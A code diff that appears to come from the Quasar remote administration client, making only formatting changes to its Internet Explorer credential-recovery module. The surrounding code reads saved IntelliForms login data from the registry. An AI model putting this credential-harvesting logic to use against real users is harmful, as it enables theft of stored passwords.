@@ -66,7 +66,7 @@ namespace Quasar.Client.Recovery.Browsers
         }
         #endregion
         #region Private Methods
-        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
+        private static string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
         static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
@@ -90,7 +90,8 @@ namespace Quasar.Client.Recovery.Browsers
             //Now retrieve the encrypted credentials for this registry hash entry....
             using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
-                if (key == null) return false;
+                if (key == null)
+                    return false;
 
                 //Retrieve encrypted data for this website hash...
                 //First get the value...
@@ -169,7 +170,8 @@ namespace Quasar.Client.Recovery.Browsers
 
             using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
-                if (key == null) return false;
+                if (key == null)
+                    return false;
 
                 if (key.GetValueNames().Any(value => value == urlHash))
                     result = true;
@@ -483,7 +485,8 @@ namespace Quasar.Client.Recovery.Browsers
 
                 if (index < _urlHistoryList.Count && index >= 0)
                     _urlHistoryList[index] = value;
-                else throw new IndexOutOfRangeException();
+                else
+                    throw new IndexOutOfRangeException();
 
             }
 
